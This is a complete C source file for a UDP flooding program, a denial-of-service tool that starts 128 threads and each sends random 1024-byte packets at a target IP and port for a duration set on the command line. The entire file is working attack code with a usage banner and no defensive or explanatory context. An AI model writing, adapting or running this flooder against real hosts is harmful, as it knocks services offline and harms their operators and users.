#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 128
#define PKT_SIZE    1024

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

volatile int running = 1;

void *flood(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &addr.sin_addr);

    char payload[PKT_SIZE];
    for (int i = 0; i < PKT_SIZE; i++) payload[i] = rand() % 256;

    time_t end = time(NULL) + data->duration;
    while (running && time(NULL) < end) {
        sendto(sock, payload, PKT_SIZE, MSG_NOSIGNAL, (struct sockaddr*)&addr, sizeof(addr));
    }

    close(sock);
    return NULL;
}

int main(int argc, char **argv) {
    if (argc != 4) {
        printf("Usage: ./flood <IP> <PORT> <TIME>\n");
        return 1;
    }

    struct thread_data data;
    strncpy(data.ip, argv[1], 16);
    data.port = atoi(argv[2]);
    data.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];
    srand(time(NULL));

    printf("[+] Flooding %s:%d for %ds...\n", data.ip, data.port, data.duration);

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, flood, (void *)&data);
    }

    sleep(data.duration);
    running = 0;

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    return 0;
}